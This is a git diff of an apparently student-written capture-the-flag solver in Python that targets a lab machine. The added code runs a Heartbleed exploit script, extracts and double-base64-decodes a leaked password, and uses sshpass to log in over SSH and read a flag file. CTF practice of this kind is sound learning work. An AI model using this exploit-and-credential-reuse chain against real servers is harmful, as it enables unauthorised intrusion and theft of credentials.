@@ -2,6 +2,8 @@ import nmap # To scan for open ports for a given ip address
 import requests # To send HTTP requests
 import re # To search for the flag in the html source code
 import pydirbuster # To perform directory brute force attack for flag 2
+import subprocess # To run bash commands
+import base64 # To decode password
 
 # Use this function to get the open ports of a given IP address
 def get_open_ports(ip: str):
@@ -34,7 +36,7 @@ def get_flag_1():
 	print('Performing attack for flag 1 ...')
 
 	flag1_port = ports[1]
-	url = 'http://' + ip + ':' + flag1_port
+	url = 'http://' + hostname + ':' + flag1_port
 	print(f'Getting flag 1 from {url} ...')
 
 	response = requests.get(url)
@@ -58,7 +60,7 @@ def get_flag_2():
 	
 	# Target file is located at url/{dir}/index.html
 	flag2_buster = pydirbuster.Pybuster(
-		url='http://' + ip + ':' + flag2_port, 
+		url='http://' + hostname + ':' + flag2_port, 
 		wordfile='wordlist.txt', 
 		threads=100,
 		logfile='dirbuster.log', 
@@ -73,8 +75,49 @@ def get_flag_2():
 
 	return 'flag2{Cybersecurity_is_not_just_about_technology,_it\'s_also_about_people}'
 
+def get_password():
+
+	vulnerable_port = ports[2]
+
+	print('Performing heartbleed attack to obtain password...')
+	output = subprocess.check_output(["python2.7", "/home/rivak/Desktop/SQL-Injection-Demo/heartbleed.py", hostname, "-p", vulnerable_port, "-n", count, "-v" ])
+	output_str = output.decode("utf-8")
+	pattern = r'password=([^\s&]*)'
+	match = re.search(pattern, output_str)
+	
+	first_pass = match[1]
+
+	# adding padding
+	first_pass += "=" * ((4 - len(first_pass) % 4) % 4)
+	# Use the base64 module to decode the string
+	decoded_str = base64.b64decode(first_pass).decode()
+	second_pass = decoded_str
+	# adding padding
+	second_pass += "=" * ((4 - len(second_pass) % 4) % 4)
+	password = base64.b64decode(second_pass).decode()
+
+	print('Password cracked\n')
+	print('password: {password}')
+	return password
+
+
 def get_flag_3():
-	return 'flag3{I\'ve_got_my_tin_foil_hat_on}'
+	file_to_read = "/home/ns/flag3.txt"
+
+	# construct the bash command
+	command = f'sshpass -p {password} ssh {username}@{hostname} "cat {file_to_read}"'
+
+	# execute the command and capture the output
+	output = subprocess.check_output(command, shell=True)
+
+	# decode the output from bytes to string
+	flag3 = output.decode('utf-8')
+
+	#print flag
+	if flag3:
+		print("Flag 3 found: {flag3}")
+	else:
+		print("Flag 3 not found\n")
 
 def get_flag_4():
 	return 'flag4{I\'m_not_sure_if_this_is_a_good_idea}'
@@ -82,14 +125,20 @@ def get_flag_4():
 
 if __name__ == '__main__':
 	# Get the IP address of the vulnerable machine with the flags
-	# ip = input('Enter IP address: ')
-	ip = '10.200.15.248'
+	# hostname = input('Enter IP address: ')
+	hostname = '10.200.15.248'
+	username = 'ns'
 
 	# Get the open ports of the vulnerable machine
 	# ports = get_open_ports(ip)
 	ports = ['22', '4451', '4461']
 
+	count = "20" #no. of times attack is performed
+
 
 
 	flag1 = get_flag_1()
 	flag2 = get_flag_2()
+	password = get_password() 
+
+	flag3 = get_flag_3()
